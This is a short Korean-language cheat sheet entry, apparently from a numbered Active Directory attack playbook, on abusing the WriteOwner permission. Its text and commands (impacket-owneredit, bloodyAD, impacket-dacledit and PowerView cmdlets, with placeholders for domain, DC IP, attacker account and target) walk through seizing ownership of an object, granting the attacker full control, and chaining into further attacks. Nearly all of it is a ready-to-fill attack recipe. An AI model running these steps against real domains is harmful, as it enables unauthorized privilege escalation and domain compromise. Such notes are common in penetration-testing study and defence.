# 04_WriteOwner

WriteOwner는 대상 오브젝트의 소유자를 변경할 수 있는 권한이다. 소유자가 되면 자동으로 WriteDACL 권한을 획득하므로, 소유자 변경 → GenericAll 부여 → 해당 타입 공격 체인으로 이어간다.

```bash
# 1단계: 소유자 변경 (LDAP 389)
impacket-owneredit <도메인>/<공격자계정>:'<패스워드>' \
  -dc-ip <DC_IP> \
  -action write \
  -new-owner <공격자계정> \
  -target <대상오브젝트>  # ← 수정

bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  set owner <대상오브젝트> <공격자계정>  # ← 수정

# 2단계: 소유자로서 GenericAll 부여 (LDAP 389)
impacket-dacledit <도메인>/<공격자계정>:'<패스워드>' \
  -dc-ip <DC_IP> \
  -action write \
  -rights FullControl \
  -principal <공격자계정> \
  -target <대상오브젝트>  # ← 수정

# 3단계: 해당 오브젝트 타입의 GenericAll 공격 적용
```

```powershell
Set-DomainObjectOwner -Identity <대상오브젝트> -OwnerIdentity <공격자계정>  # ← 수정
Add-DomainObjectAcl -TargetIdentity <대상오브젝트> `
  -PrincipalIdentity <공격자계정> -Rights All -Verbose
```